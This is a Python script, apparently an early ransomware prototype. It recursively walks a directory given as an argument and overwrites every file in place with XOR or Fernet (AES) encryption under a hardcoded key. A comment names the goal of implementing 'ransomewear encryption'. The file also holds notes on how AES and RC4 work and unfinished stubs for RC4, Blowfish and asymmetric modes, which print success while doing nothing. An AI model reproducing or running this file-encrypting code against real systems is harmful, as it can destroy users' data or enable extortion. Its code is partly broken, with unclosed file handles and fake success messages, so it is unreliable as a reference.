
#!/usr/bin/env python3

#imports
from pathlib import Path
import numpy
import sys
import os
import re
import binascii
import base64
from itertools import cycle
from cryptography.fernet import Fernet,InvalidToken

#Step 1: 
#Scan dir presented to find all files located inside file.
xorKey = "FLS"
encoder = "latin_1"
AESkey = "oz_S22im8QEMyZxto-C_6J9HwIYOGc9rux4fh-si1So="
def encryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:        
            # data can be held in differnt formats which mean we have to account for them.
            data = open(os.path.join(root,file1),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))            
            data.write(value)
            data.truncate()
            data.close()
            
def decryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files:
            data = open(os.path.join(root,file2),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))
            # value = ''.join(chr(ord(x)^ord(y)) for (x,y) in zip(str(dataValue), cycle(xorKey)))      
            data.write(value) #writes over the files <---- so we want to implement our ransomewear encryption here
            data.truncate()
            data.close



 #How does AES WORK
 # key = 128: 10 rounds ,192: 12 rounds ,256: 14 rounds
 # take total key and break it down into chunks (128 bits -> key1 , 2, 3, .... )
 # take 16 bytes and do somthing with it to encrpyt it
 # arrange in grid 4x4 bits so 16 bits
 # 
 # get plain text -> perform xor to text with key1->  
 # sub bytes into the chunks of the 4x4 -> shift rows -> mix columns -> add round key which is k2,k3,k4 etc
 # ^ this is 1 round from sub bytes to add round key



def encryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.encrypt(data_value))
            data.truncate()
            data.close
def decryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files: 
            data = open(os.path.join(root,file2),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.decrypt(data_value))  
            data.truncate()
            data.close()


#HOW RC4 WORKS ALGO
# stream cipher and variable key algo
# algo encrypts one bye at a time 
# key input is psudi random bit generator that produces a stream 8 bit number




#def encryptRC4():
              
#def decryptRC4():

#def encryptBlowfish():
            
#def decryptBlowfish():



# to run command enter
#python3 $nameoffile (filename, (sym or asym), (encryption type), (encrypt or decrypt))

def main():
    if len(sys.argv) <= 1 :
        print("folder expected")
    else:
        if len(sys.argv) <= 2 :
            print("put type of algorithm")
        else:
            if sys.argv[2] == "sym":
                if len(sys.argv) <= 3 :
                    print("put algorithm")
                else:
                    if sys.argv[3] == "XOR":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptXor()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptXor()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "AES":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptAES()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptAES()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "RC4":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #encryptRC4()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                #decryptRC4()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "Blowfish":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #encryptBlowfish()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                #decryptBlowfish()
                                print("DONE Decryption")
                                #print(holder)
            elif sys.argv[2] == "asym":
                print ("still need to add stuff")


if __name__ == "__main__":
    # execute only if run as a script
    main()


"""if len(binary_representation) == 7:
                    binary_representation = "0"+binary_representation
                if len(binary_representation) == 6:
                    binary_representation = "00"+binary_representation
                if len(binary_representation) == 5:
                    binary_representation = "000"+binary_representation
                if len(binary_representation) == 4:
                    binary_representation = "0000"+binary_representation
                if len(binary_representation) == 3:
                    binary_representation = "00000"+binary_representation
                if len(binary_representation) == 2:
                    binary_representation = "000000"+binary_representation
                if len(binary_representation) == 1:
                    binary_representation = "0000000"+binary_representation
"""

 